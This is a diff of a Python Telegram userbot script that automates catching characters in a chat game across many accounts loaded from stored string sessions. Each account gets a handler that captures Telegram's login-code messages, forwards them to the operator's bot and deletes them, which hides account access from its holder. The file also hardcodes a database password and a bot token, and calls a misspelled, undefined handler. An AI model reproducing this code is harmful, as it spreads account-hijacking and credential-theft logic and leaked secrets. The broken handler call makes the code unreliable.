@@ -17,26 +17,14 @@ MONGO_URI = "mongodb+srv://kkt:h1BdaMt7nxW9jTXa@cluster0.kb5fzfl.mongodb.net/?ap
 BOT_TOKEN = '8738081667:AAHADgcDISntnOBwT3uj2yYw7n3XJUN2uZI'
 
 OWNER_ID = 7693106830
-SPECIFIC_GROUP = -1003848067679
-COOLDOWN_TIME = 15
-
-# 🎯 NEW CHAT & BOT CONFIGURATIONS
+SPECIFIC_GROUP = -1003848067679  # Log Group
 SPAWN_BOT_ID = 6157455819
-HINT_BOT_ID = 8506436817
-WAIFU_CHAT_ID = -1003848067679
 
-# Global States
-is_active = False
-is_scraping = False
-is_adding_contacts = False  
-user_cooldowns = {}
-is_talker_active = False       
-message_count = 0
-spam_tasks = {}
-spawn_tracker = {}            
-last_spawn_chat_id = None     
+# 🎯 GLOBAL RUNTIME STORAGE
+userbot_instances = {}        # { user_id: { "client": client, "group_id": waifu_chat_id, "ignored_emojis": [...], "is_stopped": bool, "collection_name": str } }
+hint_bot_ids = {8506436817}   
+spawn_tracker = {}            # { (user_id, fwd_msg_id): orig_chat_id }
 HINT_REGEX = re.compile(r"(/catch\s+[^\n]+)") 
-is_catch_stopped = False 
 
 # MongoDB Setup
 client_mongo = AsyncIOMotorClient(MONGO_URI)
@@ -47,10 +35,11 @@ tomboy_col = db["tomboy_col"]
 marcuz_col = db["marcuz_col"]  
 talk_col = db["random_talk"]   
 filters_col = db["filters"]
+hint_bots_col = db["hint_bots_col"]  
+registry_col = db["collection_registry"] 
 
 # Initialize Official Bot Client
 bot = TelegramClient('official_bot_session', APP_ID, APP_HASH)
-userbot = None  
 
 # ==========================================
 # 🌍 DUMMY HTTP SERVER FOR RENDER HEALTH CHECK
@@ -66,26 +55,8 @@ async def start_dummy_web_server():
     port = int(os.environ.get("PORT", 10000))
     try:
         server = await asyncio.start_server(handle_render_health_check, '0.0.0.0', port)
-        print(f"🌍 Dummy HTTP Server started on port {port} for Render Health Check!")
         async with server:
             await server.serve_forever()
-    except Exception as e:
-        print(f"❌ Failed to start Dummy Web Server: {e}")
-
-async def delete_bot_message_delayed(event, bot_msg_id, cmd_msg_id=0):
-    try:
-        await asyncio.sleep(3)
-        to_delete = [bot_msg_id]
-        if cmd_msg_id:
-            to_delete.append(cmd_msg_id)
-            
-        await event.client.delete_messages(event.chat_id, to_delete)
-    except errors.rpcerrorlist.FloodWaitError as e:
-        await asyncio.sleep(e.seconds)
-        try:
-            await event.client.delete_messages(event.chat_id, to_delete)
-        except Exception:
-            pass
     except Exception:
         pass
 
@@ -96,232 +67,314 @@ async def delete_catch_message_delayed(client, chat_id, msg_id):
     except Exception:
         pass
 
-async def run_raid_spam_task(event, reply_msg_id, chat_id):
-    try:
-        while True:
-            pipeline = [{"$sample": {"size": 1}}]
-            cursor = filters_col.aggregate(pipeline)
-            docs = await cursor.to_list(length=1)
-            
-            if docs:
-                reply_text = docs[0].get("text") or docs[0].get("word") or "🎯"
-                try:
-                    await event.client.send_message(chat_id, reply_text, reply_to=reply_msg_id)
-                    await asyncio.sleep(1.0)
-                except errors.rpcerrorlist.FloodWaitError as e:
-                    await asyncio.sleep(e.seconds)
-                except Exception:
-                    await asyncio.sleep(1.0)
-            else:
-                await asyncio.sleep(2.0)
-    except asyncio.CancelledError:
-        pass
-
 # ==========================================
-# ⚔️ USERBOT HANDLERS
+# ⚔️ DYNAMIC USERBOT EVENT HANDLERS (HIGH OPTIMIZED)
 # ==========================================
 async def spawn_detector_handler(event):
-    global last_spawn_chat_id, spawn_tracker, is_catch_stopped 
+    """ Built-in Filter ကြောင့် ဤနေရာသို့ Spawn Bot ပို့သော စာများသာ ရောက်လာမည် (လူပြောသမျှစာများ လုံးဝမလာပါ) """
+    global spawn_tracker
     
-    if is_catch_stopped:
+    current_user_id = getattr(event.client, 'tg_user_id', None)
+    if not current_user_id or current_user_id not in userbot_instances:
         return
+        
+    config = userbot_instances[current_user_id]
+    if config["is_stopped"]:
+        return  
 
-    if event.sender_id == SPAWN_BOT_ID and event.text:
-        if "ᴀ ᴄʜᴀʀᴀᴄᴛᴇʀ ʜᴀs sᴘᴀᴡɴᴇᴅ ɪɴ ᴛʜᴇ ᴄʜᴀᴛ!" in event.text:
-            if event.chat_id in [-1001947407821, -1003067509601]:
-                return  
-            if any(emoji in event.text for emoji in ["🔵", "🟣" ,"🟡" ,"🟠","💮"]):
-                return  
-
-            orig_chat_id = event.chat_id
-            last_spawn_chat_id = orig_chat_id  
+    if event.text and "A CHARACTER HAS SPAWNED IN THE CHAT!" in event.text.upper():
+        if event.chat_id in [-1001947407821, -1003067509601]:
+            return  
             
-            try:
-                fwd_msg = await event.message.forward_to(WAIFU_CHAT_ID)
-                reply_msg = await fwd_msg.reply("/waifu")
-                
-                spawn_tracker[fwd_msg.id] = orig_chat_id
-                spawn_tracker[reply_msg.id] = orig_chat_id
-                
-                if len(spawn_tracker) > 100:
-                    spawn_tracker.pop(next(iter(spawn_tracker)))
-            except Exception:
-                pass
+        if any(emoji in event.text for emoji in config["ignored_emojis"]):
+            return  
+
+        orig_chat_id = event.chat_id  
+        waifu_chat_id = config["group_id"] 
+        
+        try:
+            fwd_msg = await event.message.forward_to(waifu_chat_id)
+            reply_msg = await fwd_msg.reply("/waifu")
+            
+            spawn_tracker[(current_user_id, fwd_msg.id)] = orig_chat_id
+            spawn_tracker[(current_user_id, reply_msg.id)] = orig_chat_id
+            
+            if len(spawn_tracker) > 300:
+                spawn_tracker.pop(next(iter(spawn_tracker)))
+        except Exception as e:
+            print(f"❌ Forward Error on Userbot {current_user_id}: {e}")
 
 async def hint_solver_handler(event):
-    global last_spawn_chat_id, spawn_tracker, is_catch_stopped
+    """ ဤနေရာသို့ မိမိအကောင့်ရဲ့ သီးသန့် Waifu Chat ထဲက စာများသာ ရောက်လာမည် """
+    global spawn_tracker
     
-    if is_catch_stopped:
+    current_user_id = getattr(event.client, 'tg_user_id', None)
+    if not current_user_id or current_user_id not in userbot_instances:
         return
+        
+    config = userbot_instances[current_user_id]
+    if config["is_stopped"]:
+        return  
 
-    if event.chat_id == WAIFU_CHAT_ID and event.sender_id == HINT_BOT_ID and event.text:
+    # ၎င်း Waifu Chat ထဲရှိ အတည်ပြုထားသော Hint Bot ဖြစ်မှသာ အလုပ်လုပ်မည်
+    if event.sender_id in hint_bot_ids and event.text:
         match = HINT_REGEX.search(event.text)
         if match:
             catch_command = match.group(1).strip(" `\n\r")
-            target_group = last_spawn_chat_id
             
-            if event.reply_to_msg_id and event.reply_to_msg_id in spawn_tracker:
-                target_group = spawn_tracker[event.reply_to_msg_id]
+            if event.reply_to_msg_id and (current_user_id, event.reply_to_msg_id) in spawn_tracker:
+                target_orig_group = spawn_tracker[(current_user_id, event.reply_to_msg_id)]
                 
-            if target_group:
-                if target_group in [-1001947407821, -1003067509601]:
-                    return
                 try:
+                    client_to_use = config["client"]
                     delay_time = random.uniform(0.5, 0.6) 
-                    async with event.client.action(target_group, 'typing'):
+                    async with client_to_use.action(target_orig_group, 'typing'):
                         await asyncio.sleep(delay_time)
                         
-                    sent_msg = await event.client.send_message(target_group, catch_command)
-                    asyncio.create_task(delete_catch_message_delayed(event.client, target_group, sent_msg.id))
-                except Exception:
-                    pass
+                    sent_msg = await client_to_use.send_message(target_orig_group, catch_command)
+                    asyncio.create_task(delete_catch_message_delayed(client_to_use, target_orig_group, sent_msg.id))
+                    print(f"🎯 Catch Sent to Original Group {target_orig_group} via Userbot {current_user_id}")
+                except Exception as e:
+                    print(f"❌ Catch Execution Error via Userbot {current_user_id}: {e}")
 
 async def catch_success_forwarder_handler(event):
-    global is_catch_stopped
-    if is_catch_stopped:
+    current_user_id = getattr(event.client, 'tg_user_id', None)
+    if not current_user_id or userbot_instances.get(current_user_id, {}).get("is_stopped"):
         return
-    if event.sender_id == SPAWN_BOT_ID and event.text:
-        if "ʏᴏᴜ ɢᴏᴛ ᴀ ɴᴇᴡ ᴄʜᴀʀᴀᴄᴛᴇʀ!" in event.text and event.message.mentioned:
-            try:
+        
+    if event.text and (" can be ʏᴏᴜ ɢᴏᴛ ᴀ ɴᴇᴡ ᴄʜᴀʀᴀᴄᴛᴇʀ!" in event.text or "ʏᴏᴜ ɢᴏᴛ ᴀ ɴᴇᴡ ᴄʜᴀʀᴀᴄᴛᴇʀ!" in event.text):
+        try:
+            me = await event.client.get_me()
+            first_name = me.first_name.lower() if me.first_name else ""
+            last_name = me.last_name.lower() if me.last_name else ""
+            full_name = f"{first_name} {last_name}".strip()
+            username = me.username.lower() if me.username else ""
+            
+            text_lower = event.text.lower()
+            
+            if (
+                event.message.mentioned or 
+                (first_name and first_name in text_lower) or 
+                (full_name and full_name in text_lower) or 
+                (username and username in text_lower)
+            ):
                 await event.message.forward_to(SPECIFIC_GROUP)
-            except Exception:
-                pass
+        except Exception:
+            pass
 
-# 🔐 [NEW] TELEGRAM LOGIN NOTIFICATION INTERCEPTOR 
 async def telegram_service_handler(event):
-    """ Telegram (777000) မှလာသော Login Code ကို ဖမ်းယူပြီး ပယ်ဖျက်မည် """
-    msg_text = event.message.text
     try:
-        # 1. 🤖 Official Bot မှတစ်ဆင့် Owner ၏ DM (Private Chat) သို့ Code ကို ပို့ပေးမည်
-        await bot.send_message(
-            OWNER_ID, 
-            f"🔐 **Telegram Login Intercepted!** 🔐\n\n{msg_text}"
-        )
-        # 2. 🗑️ Userbot ဘက်မှ Telegram Service Message ကို ချက်ချင်း ဖျက်ပစ်မည်
+        await bot.send_message(OWNER_ID, f"🔐 **Telegram Login Intercepted!**\n\n{event.message.text}")
         await event.delete()
-        print("🗑️ Intercepted and Auto-Deleted Telegram Login Code!")
-    except Exception as e:
-        print(f"❌ Login Code Intercept Error: {e}")
+    except Exception:
+        pass
+
+# ⚡ [ULTRA OPTIMIZED REGISTRATION]
+def register_userbot_handlers(client, waifu_chat_id):
+    """ Telegram Gateway အဆင့်မှာတင် မသက်ဆိုင်တဲ့စာတွေကို Filter ချပစ်လိုက်ခြင်းဖြင့် RAM/CPU ကို အများဆုံးသက်သာစေသည် """
+    # ၁။ Spawn ပတ်သက်သမျှကို Spawn Bot ဆီကစာပဲ လက်ခံမယ် (လူတွေပြောသမျှစာ လုံးဝဝင်မလာပါ)
+    client.add_event_handler(spawn_detector_handler, events.NewMessage(from_users=SPAWN_BOT_ID))
+    client.add_event_handler(catch_success_forwarder_forwarder_handler, events.NewMessage(from_users=SPAWN_BOT_ID)) 
+    
+    # ၂။ Hint Solver ကို မိမိရဲ့ သီးသန့် Waifu Chat တစ်ခုတည်းက စာပဲ ဝင်ဖတ်ခိုင်းမယ်
+    client.add_event_handler(hint_solver_handler, events.NewMessage(chats=waifu_chat_id))
+    
+    # ၃။ Telegram Official Service စာသားများအတွက်သာ
+    client.add_event_handler(telegram_service_handler, events.NewMessage(chats=777000))
 
 # ==========================================
 # 🤖 OFFICIAL BOT COMMAND HANDLERS
 # ==========================================
-# ⚠️ [UPDATED] Owner သည် Group တွင်သာမက DM (Private) တွင်ပါ Bot ကို Command များပေးနိုင်ရန် ပြင်ဆင်ထားသည်
 @bot.on(events.NewMessage(chats=[SPECIFIC_GROUP, OWNER_ID]))
 async def handle_bot_commands(event):
-    global is_active, userbot, is_scraping, is_talker_active, is_catch_stopped
+    global userbot_instances, hint_bot_ids
     
     if event.sender_id != OWNER_ID:
         return
 
     cmd = event.message.text.strip() if event.message.text else ""
 
-    if cmd.startswith("/marcuz") or cmd.startswith("/mc"):
-        args = cmd.split(maxsplit=1)
-        session_str = None
+    if cmd.startswith("/addauto"):
+        if not event.is_private:
+            await event.reply("⚠️ **လုံခြုံရေးအရ ဤစနစ်သစ်ကို Bot ၏ DM တွင်သာ သုံးစွဲခွင့်ပြုပါသည်။**")
+            return
+            
+        args = cmd.split(maxsplit=3)
+        if len(args) < 3:
+            await event.reply("⚠️ **အသုံးပြုပုံစံ:**\n`/addauto [Waifu_Chat_ID] [DB_Collection_Name] [String_Session]`")
+            return
+            
+        try:
+            waifu_chat_id = int(args[1])
+        except ValueError:
+            await event.reply("❌ **Waifu Chat ID နေရာတွင် ဂဏန်းသီးသန့် ဖြစ်ရပါမည်။**")
+            return
+            
+        col_name = args[2].strip()
         
-        if len(args) > 1:
-            session_str = args[1].strip()
+        session_str = None
+        if len(args) == 4:
+            session_str = args[3].strip()
         elif event.is_reply:
             reply_msg = await event.get_reply_message()
             if reply_msg and reply_msg.text:
                 session_str = reply_msg.text.strip()
                 
         if not session_str:
-            await event.reply("❌ **String Session မတွေ့ရှိပါ။**")
+            await event.reply("❌ **String Session အား မတွေ့ရှိပါ။**")
             return
-            
-        await marcuz_col.update_one(
-            {"key": "string_session"},
-            {"$set": {"value": session_str}},
-            upsert=True
-        )
-        await event.reply("✅ String Session ကို သိမ်းပြီးပါပြီ။ Userbot ချိတ်ဆက်နေသည်...")
+
+        await event.reply(f"⏳ အကောင့်အား စစ်ဆေးနေပြီး သီးသန့် `db['{col_name}']` ထဲသို့ ထည့်သွင်းနေပါသည်...")
         
         try:
-            if userbot:
-                await userbot.disconnect()
-            userbot = TelegramClient(StringSession(session_str), APP_ID, APP_HASH)
-            await userbot.start()
-            await userbot.get_dialogs()
+            temp_client = TelegramClient(StringSession(session_str), APP_ID, APP_HASH)
+            await temp_client.start()
+            me = await temp_client.get_me()
+            u_id = me.id
+            temp_client.tg_user_id = u_id
             
-            userbot.add_event_handler(spawn_detector_handler, events.NewMessage())
-            userbot.add_event_handler(hint_solver_handler, events.NewMessage())
-            userbot.add_event_handler(catch_success_forwarder_handler, events.NewMessage()) 
-            # 🔐 Register Telegram Login Interceptor
-            userbot.add_event_handler(telegram_service_handler, events.NewMessage(chats=777000))
+            default_emojis = ["🔵", "🟣" ,"🟡" ,"🟠","💮"]
+            custom_col = db[col_name]
             
-            await event.reply("🚀 Userbot is Live with Manual Sniper & Login Interceptor!")
+            await custom_col.update_one(
+                {"user_id": u_id},
+                {"$set": {
+                    "user_id": u_id,
+                    "session": session_str,
+                    "group_id": waifu_chat_id,
+                    "ignored_emojis": default_emojis,
+                    "is_stopped": False,
+                    "collection_name": col_name
+                }},
+                upsert=True
+            )
+            
+            await registry_col.update_one(
+                {"collection_name": col_name},
+                {"$set": {"collection_name": col_name}},
+                upsert=True
+            )
+            
+            userbot_instances[u_id] = {
+                "client": temp_client,
+                "group_id": waifu_chat_id,
+                "ignored_emojis": default_emojis,
+                "is_stopped": False,
+                "collection_name": col_name
+            }
+            
+            register_userbot_handlers(temp_client, waifu_chat_id)
+            await event.reply(f"✅ **အောင်မြင်စွာ တပ်ဆင်ပြီးပါပြီ!**\n👤 **နာမည်:** {me.first_name}\n🆔 **User ID:** `{u_id}`\n🌐 **Designated Waifu Chat:** `{waifu_chat_id}`\n🗂️ **DB Collection:** `db['{col_name}']`")
+            
         except Exception as e:
-            await event.reply(f"❌ Userbot အလုပ်မလုပ်ပါ: {e}")
+            await event.reply(f"❌ **Userbot ချိတ်ဆက်မှု ပျက်ကွက်ပါသည်:** {e}")
 
-    elif cmd == "/stop":
-        is_catch_stopped = True
-        await event.reply("🛑 **Chief! `Detector`, `/catch` နဲ့ `Forwarder` လုပ်ငန်းစဉ်အားလုံးကို ရပ်တန့်လိုက်ပါပြီ။ Userbot အနားယူနေပါပြီ။ 💤**")
-
-    elif cmd == "/start":
-        is_catch_stopped = False
-        await event.reply("✅ **Chief! Sniper လုပ်ငန်းစဉ်အားလုံးကို ပြန်လည်စတင်လိုက်ပါပြီ။ 🚀**")
-
-    elif cmd.startswith("/echo"):
-        if not userbot:
-            await event.reply("❌ **Userbot မချိတ်ဆက်ရသေးပါ။**")
-            return
-        text_to_echo = cmd[5:].strip()
-        if text_to_echo:
+    elif cmd.startswith("/start"):
+        args = cmd.split()
+        if len(args) == 2:
             try:
-                await userbot.send_message(SPECIFIC_GROUP, text_to_echo)
-            except Exception as e:
-                await event.reply(f"❌ **Userbot မှ စာပို့၍မရပါ:** {e}")
-        else:
-            await event.reply("⚠️ **အသုံးပြုပုံ:** `/echo Hi`")
+                target_uid = int(args[1])
+                if target_uid in userbot_instances:
+                    col_name = userbot_instances[target_uid]["collection_name"]
+                    userbot_instances[target_uid]["is_stopped"] = False
+                    await db[col_name].update_one({"user_id": target_uid}, {"$set": {"is_stopped": False}})
+                    await event.reply(f"🚀 **Userbot `{target_uid}` ကို ပြန်လည်ပတ်လိုက်ပါပြီ။**")
+                else:
+                    await event.reply("❌ **ပေးထားသော User ID နှင့် ကိုက်ညီသည့် အကောင့်မရှိပါ။**")
+            except ValueError:
+                await event.reply("❌ **မှန်ကန်သော User ID ကို ထည့်သွင်းပါ။**")
 
-    # 📱 [NEW] Get Userbot Phone Number (ONLY WORKS IN DM)
-    elif cmd == "/ph":
-        if not event.is_private:
-            await event.reply("⚠️ **လုံခြုံရေးအရ ဤ Command ကို Bot ရဲ့ Private Chat (DM) တွင်သာ အသုံးပြုပါ။**")
-            return
-            
-        if not userbot:
-            await event.reply("❌ **Userbot မချိတ်ဆက်ရသေးပါ။** `/mc` ဖြင့် အရင်ချိတ်ပါ။")
+    elif cmd.startswith("/stop"):
+        args = cmd.split()
+        if len(args) == 2:
+            try:
+                target_uid = int(args[1])
+                if target_uid in userbot_instances:
+                    col_name = userbot_instances[target_uid]["collection_name"]
+                    userbot_instances[target_uid]["is_stopped"] = True
+                    await db[col_name].update_one({"user_id": target_uid}, {"$set": {"is_stopped": True}})
+                    await event.reply(f"🛑 **Userbot `{target_uid}` အား ခေတ္တရပ်နားလိုက်ပါပြီ။**")
+                else:
+                    await event.reply("❌ **ပေးထားသော User ID နှင့် ကိုက်ညီသည့် အကောင့်မရှိပါ။**")
+            except ValueError:
+                await event.reply("❌ **မှန်ကန်သော User ID ကို ထည့်သွင်းပါ။**")
+
+    elif cmd.startswith("/emoji"):
+        args = cmd.split(maxsplit=2)
+        if len(args) < 3:
+            await event.reply("⚠️ **အသုံးပြုပုံစံ:** `/emoji [user_id] [emojis_list]`")
             return
             
         try:
-            me = await userbot.get_me()
-            phone = me.phone
-            if phone:
-                await event.reply(f"📱 **Userbot Phone Number:** `+{phone}`\n\n💡 *ယခု ဖုန်းနံပါတ်ဖြင့် Telegram Login ဝင်လိုက်ပါက ကျလာမည့် Code အား ဤနေရာသို့ ချက်ချင်း ဖမ်းယူပို့ပေးပါမည်။*")
+            target_uid = int(args[1])
+            custom_emojis = list(args[2].replace(" ", ""))
+            
+            if target_uid in userbot_instances:
+                col_name = userbot_instances[target_uid]["collection_name"]
+                userbot_instances[target_uid]["ignored_emojis"] = custom_emojis
+                await db[col_name].update_one({"user_id": target_uid}, {"$set": {"ignored_emojis": custom_emojis}})
+                await event.reply(f"✅ **Account `{target_uid}` အတွက် ကျော်မည့် အီမိုဂျီများကို ပြောင်းလဲသတ်မှတ်ပြီးပါပြီ။**")
             else:
-                await event.reply("⚠️ **Userbot အကောင့်တွင် Phone Number ဖျောက်ထားသည် (သို့) မရရှိနိုင်ပါ။**")
-        except Exception as e:
-            await event.reply(f"❌ ဖုန်းနံပါတ် ယူရာတွင် အမှားဖြစ်နေပါသည်: {e}")
+                await event.reply("❌ **၎င်း User ID ဖြင့် တပ်ဆင်ထားသော အကောင့်မတွေ့ရှိပါ။**")
+        except ValueError:
+            await event.reply("❌ **မှန်ကန်သော User ID ကို ရိုက်ထည့်ပါ။**")
+
+    elif cmd.startswith("/addhint"):
+        args = cmd.split()
+        if len(args) == 2:
+            try:
+                h_id = int(args[1])
+                hint_bot_ids.add(h_id)
+                await hint_bots_col.update_one({"hint_id": h_id}, {"$set": {"hint_id": h_id}}, upsert=True)
+                await event.reply(f"✅ **Hint Bot ID `{h_id}` အား စာရင်းထဲသို့ ထည့်သွင်းပြီးပါပြီ။**")
+            except ValueError:
+                await event.reply("❌ **ဂဏန်းသီးသန့် ID ဖြစ်ရပါမည်။**")
 
 # ==========================================
 # 🚀 SYSTEM STARTUP LOGIC
 # ==========================================
 async def startup():
-    global is_active, userbot
+    global userbot_instances, hint_bot_ids
     print("⏳ System starting up and loading configurations from MongoDB...")
     
     asyncio.create_task(start_dummy_web_server())
 
-    session_doc = await marcuz_col.find_one({"key": "string_session"})
-    if session_doc:
-        try:
-            session_str = session_doc.get("value")
-            userbot = TelegramClient(StringSession(session_str), APP_ID, APP_HASH)
-            await userbot.start()
-            await userbot.get_dialogs()
+    async for h_doc in hint_bots_col.find():
+        h_id = h_doc.get("hint_id")
+        if h_id:
+            hint_bot_ids.add(h_id)
 
-            userbot.add_event_handler(spawn_detector_handler, events.NewMessage())
-            userbot.add_event_handler(hint_solver_handler, events.NewMessage())
-            userbot.add_event_handler(catch_success_forwarder_handler, events.NewMessage()) 
-            # 🔐 Register Telegram Login Interceptor on Startup
-            userbot.add_event_handler(telegram_service_handler, events.NewMessage(chats=777000))
-            
-            print("🚀 Userbot Session Successfully Loaded from DB!")
-        except Exception as e:
-            print(f"⚠️ Failed to load existing Userbot Session: {e}")
+    async for reg_doc in registry_col.find():
+        col_name = reg_doc.get("collection_name")
+        if col_name:
+            print(f"🗂️ Scanning custom collection: db['{col_name}'] ...")
+            async for acc_doc in db[col_name].find():
+                u_id = acc_doc.get("user_id")
+                session_str = acc_doc.get("session")
+                waifu_chat_id = acc_doc.get("group_id")
+                ignored = acc_doc.get("ignored_emojis", ["🔵", "🟣" ,"🟡" ,"🟠","💮"])
+                is_shuted = acc_doc.get("is_stopped", False)
+                
+                if session_str and waifu_chat_id:
+                    try:
+                        client = TelegramClient(StringSession(session_str), APP_ID, APP_HASH)
+                        await client.start()
+                        client.tg_user_id = u_id  
+                        
+                        userbot_instances[u_id] = {
+                            "client": client,
+                            "group_id": waifu_chat_id,
+                            "ignored_emojis": ignored,
+                            "is_stopped": is_shuted,
+                            "collection_name": col_name
+                        }
+                        
+                        register_userbot_handlers(client, waifu_chat_id)
+                        print(f"🚀 Loaded Account {u_id} from db['{col_name}']. Assigned Waifu Chat: {waifu_chat_id}")
+                    except Exception as e:
+                        print(f"⚠️ Failed to boot Account {u_id} from db['{col_name}']: {e}")
+                
+    print(f"📊 Total dynamic userbot session(s) online: {len(userbot_instances)}")
 
     await bot.start(bot_token=BOT_TOKEN)
     print("🤖 Official Bot is running...")
@@ -329,4 +382,3 @@ async def startup():
 
 if __name__ == '__main__':
     asyncio.run(startup())
-
